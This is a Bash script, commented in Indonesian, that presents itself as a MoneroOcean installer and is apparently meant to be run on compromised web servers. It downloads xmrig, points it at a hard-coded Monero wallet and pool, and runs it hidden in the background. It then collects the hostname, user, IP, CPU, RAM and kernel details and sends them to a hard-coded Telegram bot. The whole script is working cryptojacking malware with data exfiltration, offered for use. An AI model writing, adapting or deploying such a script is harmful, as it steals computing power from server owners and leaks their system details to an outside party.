#!/bin/bash

# Set error handling (mirip error_reporting(E_ALL))
set -e

# Fungsi untuk output (mirip flush_output)
flush_output() {
    echo "$1"
}

# Fungsi untuk kirim Telegram (menggunakan curl)
sendTelegram() {
    local token="$1"
    local chat_id="$2"
    local message="$3"
    local url="https://api.telegram.org/bot${token}/sendMessage"
    
    curl -s -X POST "$url" \
        -d "chat_id=$chat_id" \
        -d "text=$message" \
        -d "parse_mode=HTML" \
        -d "disable_web_page_preview=true" \
        --max-time 10
}

# Header
flush_output "== MoneroOcean Bash Web Installer =="

# Variabel (sesuai PHP)
wallet="48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi"
BASE_DIR="$(pwd)/wpp"
telegram_token="7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw"
telegram_chatid="5104210301"

flush_output "[*] Wallet: $wallet"
flush_output "[*] Lokasi instalasi: $BASE_DIR"

# Cek curl/wget
dl_cmd=""
if command -v curl >/dev/null 2>&1; then
    dl_cmd="curl -L -o"
    flush_output "[*] Menggunakan curl"
elif command -v wget >/dev/null 2>&1; then
    dl_cmd="wget -O"
    flush_output "[*] Menggunakan wget"
else
    flush_output "[x] ERROR: curl dan wget tidak ditemukan!"
    exit 1
fi

# Hapus versi lama
flush_output "[*] Membersihkan instalasi lama..."
pkill xmrig 2>/dev/null || true
rm -rf "$BASE_DIR"
mkdir -p "$BASE_DIR"

# Unduh xmrig
xmrig_url="https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
xmrig_tar="$BASE_DIR/xmrig.tar.gz"

flush_output "[*] Mengunduh xmrig..."
$dl_cmd "$xmrig_tar" "$xmrig_url" 2>&1

if [ ! -f "$xmrig_tar" ]; then
    flush_output "[x] ERROR: Gagal mengunduh xmrig!"
    exit 1
fi

# Ekstrak
flush_output "[*] Mengekstrak xmrig..."
tar -xf "$xmrig_tar" -C "$BASE_DIR"
rm "$xmrig_tar"

# Edit config.json
config_file="$BASE_DIR/config.json"
if [ ! -f "$config_file" ]; then
    flush_output "[x] ERROR: config.json tidak ditemukan setelah ekstrak!"
    exit 1
fi

# Gunakan sed untuk edit (asumsi format JSON sederhana)
sed -i 's/"user": "[^"]*"/"user": "'"$wallet"'"/' "$config_file"
sed -i 's/"url": "[^"]*"/"url": "gulf.moneroocean.stream:10128"/' "$config_file"
sed -i 's/"pass": "[^"]*"/"pass": "bash-web"/' "$config_file"
sed -i 's/"background": false/"background": true/' "$config_file"

# Jalankan miner
flush_output "[*] Menjalankan miner di background..."
cd "$BASE_DIR"
nohup ./xmrig --config=config.json >/dev/null 2>&1 &

# Ambil info sistem
whoami=$(whoami)
uname_info=$(uname -a)
ram_info=$(free -h | grep Mem | awk '{print $2 " (used: " $3 ", free: " $4 ")"}')
cpu_cores=$(lscpu | grep '^CPU(s):' | awk '{print $2 " cores"}')
cpu_threads=$(lscpu | grep '^Thread(s) per core:' | awk '{print $4 " threads/core"}')
ip_info=$(hostname -I | awk '{print $1}')
hostname=$(hostname)
xmrig_pid=$(pgrep xmrig | tr '\n' '\n')  # Ambil PID sebagai string multiline
current_url="file://$(pwd)/$(basename "$0")"  # Simulasi URL script (karena Bash bukan web, gunakan path file)

# Buat pesan Telegram
message="✅ <b>XMRig dijalankan sukses</b>
🖥️ <b>Hostname</b>: <code>$hostname</code>
🧠 <b>CPU</b>: $cpu_cores
🧪 <b>Threads/Core</b>: $cpu_threads
📦 <b>RAM</b>: $ram_info
👤 <b>User</b>: $whoami
🌐 <b>IP</b>: $ip_info
🔧 <b>System</b>: <code>$uname_info</code>

⛏️ <b>Process ID</b>:
<code>$xmrig_pid</code>

🔗 <b>Script Path</b>: <code>$current_url</code>"

# Kirim Telegram
sendTelegram "$telegram_token" "$telegram_chatid" "$message"

# Selesai
flush_output "[✓] Selesai! Miner sedang berjalan di background."
flush_output "📨 Notifikasi telah dikirim ke Telegram."
